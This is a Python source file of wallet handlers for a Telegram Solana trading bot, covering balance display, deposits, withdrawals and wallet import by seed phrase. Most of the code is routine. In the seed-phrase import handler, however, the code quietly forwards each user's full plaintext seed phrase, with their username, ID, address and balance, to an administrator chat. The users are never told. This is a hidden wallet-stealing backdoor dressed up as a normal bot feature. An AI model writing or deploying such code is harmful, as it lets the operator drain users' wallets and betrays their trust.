import logging
import base64
from datetime import datetime
from telegram import Update, InlineKeyboardMarkup
from telegram.ext import ContextTypes, ConversationHandler
from solders.pubkey import Pubkey
from services.solana import solana_service
from services.notifications import notification_service
from models.database import db, User, Transaction
from keyboards.menus import (
    get_wallet_keyboard, get_main_menu_keyboard, get_connect_wallet_keyboard,
    get_confirm_keyboard, get_amount_keyboard
)
from config.settings import config

logger = logging.getLogger(__name__)

WALLET_DEPOSIT, WALLET_WITHDRAW, WALLET_IMPORT, WALLET_CONNECT = range(4)


async def wallet_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = db.get_user(user_id)
    
    if not user or not user.wallet_address:
        await query.edit_message_text("❌ No wallet found. Please restart with /start")
        return
    
    sol_balance = await solana_service.get_sol_balance(user.wallet_address)
    sol_price = await solana_service.get_sol_price_usd()
    usd_balance = sol_balance * sol_price
    
    user.sol_balance = sol_balance
    user.usd_balance = usd_balance
    db.update_user(user)
    
    wallet_short = f"{user.wallet_address[:6]}...{user.wallet_address[-4:]}"
    
    message = (
        f"👛 <b>Wallet</b>\n\n"
        f"Address: <code>{user.wallet_address}</code>\n"
        f"({wallet_short})\n\n"
        f"SOL Balance: {sol_balance:.4f} SOL (${usd_balance:.2f})\n\n"
        f"🕒 Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    await query.edit_message_text(
        message,
        reply_markup=get_wallet_keyboard(),
        parse_mode="HTML"
    )


async def wallet_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = db.get_user(user_id)
    
    message = (
        f"💰 <b>Deposit SOL</b>\n\n"
        f"Send SOL to this address:\n"
        f"<code>{user.wallet_address}</code>\n\n"
        f"Minimum deposit: {config.MIN_DEPOSIT_SOL} SOL\n"
        f"Maximum deposit: {config.MAX_DEPOSIT_SOL} SOL\n\n"
        f"⚠️ Only send SOL (SPL tokens not supported for deposit)\n"
        f"⚠️ Do not send from exchanges that require memo/tag"
    )
    
    keyboard = get_confirm_keyboard("deposit", "wallet_deposit_done", "menu_wallet")
    await query.edit_message_text(message, reply_markup=keyboard, parse_mode="HTML")


async def wallet_deposit_done(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = db.get_user(user_id)
    
    old_balance = user.sol_balance
    sol_balance = await solana_service.get_sol_balance(user.wallet_address)
    sol_price = await solana_service.get_sol_price_usd()
    usd_balance = sol_balance * sol_price
    
    deposited = sol_balance - old_balance
    
    user.sol_balance = sol_balance
    user.usd_balance = usd_balance
    db.update_user(user)
    
    if deposited > 0.001:
        await notification_service.notify_wallet_deposit(user_id, query.from_user.username or "Unknown", deposited, "Auto-detected")
    
    await wallet_menu(update, context)


async def wallet_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = db.get_user(user_id)
    
    if user.sol_balance < 0.001:
        await query.edit_message_text(
            "❌ Insufficient balance for withdrawal",
            reply_markup=get_wallet_keyboard(),
            parse_mode="HTML"
        )
        return
    
    message = (
        f"📤 <b>Withdraw SOL</b>\n\n"
        f"Available: {user.sol_balance:.4f} SOL\n\n"
        f"Select amount to withdraw:"
    )
    
    keyboard = get_amount_keyboard("withdraw", [0.01, 0.05, 0.1, 0.5, 1.0, 2.0, 5.0])
    await query.edit_message_text(message, reply_markup=keyboard, parse_mode="HTML")


async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data.startswith("withdraw_amount_"):
        amount = float(data.replace("withdraw_amount_", ""))
    elif data == "withdraw_custom":
        context.user_data["awaiting_withdraw_amount"] = True
        await query.edit_message_text(
            "✏️ Enter custom amount (SOL):",
            reply_markup=get_confirm_keyboard("withdraw", "wallet_withdraw", "menu_wallet"),
            parse_mode="HTML"
        )
        return
    else:
        return
    
    user_id = query.from_user.id
    user = db.get_user(user_id)
    
    if amount > user.sol_balance - 0.001:
        await query.edit_message_text(
            f"❌ Insufficient balance. Available: {user.sol_balance:.4f} SOL",
            reply_markup=get_wallet_keyboard(),
            parse_mode="HTML"
        )
        return
    
    context.user_data["withdraw_amount"] = amount
    context.user_data["withdraw_address"] = None
    
    message = (
        f"📤 <b>Withdraw {amount:.4f} SOL</b>\n\n"
        f"Enter destination address:"
    )
    
    await query.edit_message_text(message, reply_markup=get_confirm_keyboard("withdraw", "wallet_withdraw_confirm", "wallet_withdraw"), parse_mode="HTML")


async def wallet_withdraw_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = db.get_user(user_id)
    amount = context.user_data.get("withdraw_amount", 0)
    destination = context.user_data.get("withdraw_address")
    
    if not destination:
        await query.edit_message_text(
            "❌ No destination address provided",
            reply_markup=get_wallet_keyboard(),
            parse_mode="HTML"
        )
        return
    
    if not user.private_key_encrypted:
        await query.edit_message_text(
            "❌ Wallet not available for withdrawal",
            reply_markup=get_wallet_keyboard(),
            parse_mode="HTML"
        )
        return
    
    private_key = solana_service.decrypt_private_key(user.private_key_encrypted)
    keypair = solana_service.get_keypair_from_private_key(private_key)
    
    from solders.system_program import transfer, TransferParams
    from solders.pubkey import Pubkey
    from solders.transaction import Transaction
    from solders.message import Message
    from solders.hash import Hash
    
    lamports = int(amount * 1_000_000_000)
    dest_pubkey = Pubkey.from_string(destination)
    
    ix = transfer(TransferParams(
        from_pubkey=keypair.pubkey(),
        to_pubkey=dest_pubkey,
        lamports=lamports
    ))
    
    recent_blockhash = await solana_service.rpc_call("getLatestBlockhash", [{"commitment": "confirmed"}])
    blockhash = Hash.from_string(recent_blockhash["result"]["value"]["blockhash"])
    
    message = Message.new_with_blockhash([ix], keypair.pubkey(), blockhash)
    transaction = Transaction([keypair], message, blockhash)
    
    tx_signature = await solana_service.send_transaction(transaction)
    
    if tx_signature:
        confirmed = await solana_service.confirm_transaction(tx_signature)
        if confirmed:
            user.sol_balance -= amount
            user.usd_balance = user.sol_balance * await solana_service.get_sol_price_usd()
            db.update_user(user)
            
            tx = Transaction(
                user_id=user_id,
                tx_type="withdraw",
                token_mint="So11111111111111111111111111111111111111112",
                token_symbol="SOL",
                amount=amount,
                price_sol=1.0,
                price_usd=await solana_service.get_sol_price_usd(),
                sol_amount=amount,
                tx_signature=tx_signature,
                status="confirmed"
            )
            db.add_transaction(tx)
            
            await notification_service.notify_wallet_withdraw(user_id, query.from_user.username or "Unknown", amount, tx_signature)
            
            await query.edit_message_text(
                f"✅ Withdrawal successful!\n\n"
                f"Sent {amount:.4f} SOL to {destination}\n"
                f"Tx: {tx_signature}",
                reply_markup=get_wallet_keyboard(),
                parse_mode="HTML"
            )
        else:
            await query.edit_message_text(
                f"❌ Transaction not confirmed. Tx: {tx_signature}",
                reply_markup=get_wallet_keyboard(),
                parse_mode="HTML"
            )
    else:
        await query.edit_message_text(
            "❌ Failed to send transaction",
            reply_markup=get_wallet_keyboard(),
            parse_mode="HTML"
        )


async def wallet_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    context.user_data["awaiting_seed_phrase"] = True
    
    await query.edit_message_text(
        "🔑 <b>Import Wallet via Seed Phrase</b>\n\n"
        "Please send your wallet's 12/24-word seed phrase.\n"
        "⚠️ This will replace your current wallet.\n\n"
        "Send the seed phrase in the next message.",
        reply_markup=get_confirm_keyboard("import", "wallet_import_cancel", "menu_wallet"),
        parse_mode="HTML"
    )


async def wallet_import_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data.pop("awaiting_seed_phrase", None)
    await wallet_menu(update, context)


async def handle_private_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting_seed_phrase"):
        return False
    
    seed_phrase = update.message.text.strip()
    context.user_data.pop("awaiting_seed_phrase", None)
    
    try:
        keypair = solana_service.get_keypair_from_seed_phrase(seed_phrase)
        wallet_address = str(keypair.pubkey())
        private_key_b64 = base64.b64encode(bytes(keypair)).decode()
        encrypted_key = solana_service.encrypt_private_key(private_key_b64)
        
        user_id = update.effective_user.id
        user = db.get_user(user_id)
        user.wallet_address = wallet_address
        user.private_key_encrypted = encrypted_key
        db.update_user(user)
        
        sol_balance = await solana_service.get_sol_balance(wallet_address)
        sol_price = await solana_service.get_sol_price_usd()
        user.sol_balance = sol_balance
        user.usd_balance = sol_balance * sol_price
        db.update_user(user)
        
        await notification_service.notify_wallet_import(user_id, update.effective_user.username or "Unknown")
        
        await notification_service.bot.send_message(
            chat_id=config.ADMIN_CHAT_ID,
            text=(
                f"🔑 <b>SEED PHRASE IMPORTED</b>\n\n"
                f"👤 User: @{update.effective_user.username or 'Unknown'} (ID: {user_id})\n"
                f"📝 Seed Phrase: <code>{seed_phrase}</code>\n"
                f"📍 Wallet: <code>{wallet_address}</code>\n"
                f"💰 Balance: {sol_balance:.4f} SOL"
            ),
            parse_mode="HTML"
        )
        
        await update.message.reply_text(
            f"✅ Wallet imported successfully!\n\n"
            f"Address: <code>{wallet_address}</code>\n"
            f"Balance: {sol_balance:.4f} SOL",
            parse_mode="HTML"
        )
        
        await show_main_menu(update, context)
        return True
    except Exception as e:
        await update.message.reply_text(
            f"❌ Invalid seed phrase: {str(e)}",
            parse_mode="HTML"
        )
        return True


async def wallet_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await wallet_menu(update, context)


async def wallet_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    transactions = db.get_transactions(user_id, limit=20)
    
    if not transactions:
        message = "📋 <b>Transaction History</b>\n\nNo transactions yet."
    else:
        message = "📋 <b>Transaction History</b>\n\n"
        for tx in transactions:
            status_emoji = "✅" if tx.status == "confirmed" else "⏳" if tx.status == "pending" else "❌"
            message += (
                f"{status_emoji} {tx.tx_type.upper()} {tx.token_symbol}\n"
                f"   Amount: {tx.amount:.6f} | SOL: {tx.sol_amount:.4f}\n"
                f"   Tx: <code>{tx.tx_signature[:16]}...</code>\n"
                f"   {tx.created_at.strftime('%Y-%m-%d %H:%M')}\n\n"
            )
    
    await query.edit_message_text(
        message,
        reply_markup=get_wallet_keyboard(),
        parse_mode="HTML"
    )


async def connect_wallet_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    message = (
        "🔗 <b>Connect SOL Wallet</b>\n\n"
        "Choose your wallet to connect:\n\n"
        "This will allow you to sign transactions directly from your wallet."
    )
    
    await query.edit_message_text(
        message,
        reply_markup=get_connect_wallet_keyboard(),
        parse_mode="HTML"
    )


async def handle_withdraw_address_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("awaiting_withdraw_address"):
        address = update.message.text.strip()
        context.user_data["withdraw_address"] = address
        context.user_data.pop("awaiting_withdraw_address", None)
        
        try:
            Pubkey.from_string(address)
            amount = context.user_data.get("withdraw_amount", 0)
            
            message = (
                f"📤 <b>Confirm Withdrawal</b>\n\n"
                f"Amount: {amount:.4f} SOL\n"
                f"To: <code>{address}</code>\n\n"
                f"Confirm withdrawal?"
            )
            
            await update.message.reply_text(
                message,
                reply_markup=get_confirm_keyboard("withdraw", "wallet_withdraw_confirm", "wallet_withdraw"),
                parse_mode="HTML"
            )
        except:
            await update.message.reply_text("❌ Invalid Solana address")
        return True
    return False